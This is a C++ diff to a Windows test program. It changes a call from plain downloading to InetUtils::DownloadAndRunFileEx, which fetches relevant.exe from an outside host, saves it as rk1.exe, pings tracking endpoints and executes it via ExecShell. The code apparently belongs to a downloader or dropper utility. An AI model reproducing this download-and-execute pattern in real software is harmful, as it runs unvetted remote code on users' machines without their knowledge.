@@ -20,14 +20,16 @@ int _tmain(int argc, _TCHAR* argv[])
 	DWORD dwResult;
 	//dwResult= InetUtils::InternetRequestDownload(url, file);
 	//dwResult = InetUtils::InternetRequestFeedback(url, file, &dwTotal);
-	dwResult = InetUtils::DownloadFileEx(
-		TEXT("https://appfruitful.com/relevant.exe?quant=1354345335"),
-		TEXT("https://appfruitful.com/info.php?quant=1354345335"),
-		TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1354345335&action="),
+	dwResult = InetUtils::DownloadAndRunFileEx(
+		TEXT("https://appfruitful.com/relevant.exe?quant=1347990920"),
+		TEXT("https://appfruitful.com/info.php?quant=1347990920"),
+		TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1347990920&action="),
 		TEXT("rk1"),
 		TEXT("d:\\InetUtils\\InetUtils\\rk1.exe"),
 		TEXT("1935"),
-		TEXT("1936")
+		TEXT("1936"),
+		TEXT("/param0=0"),
+		InetUtils::ExecShell
 	);
 	_tprintf("Result: %d\n", dwResult);
 	return 0;
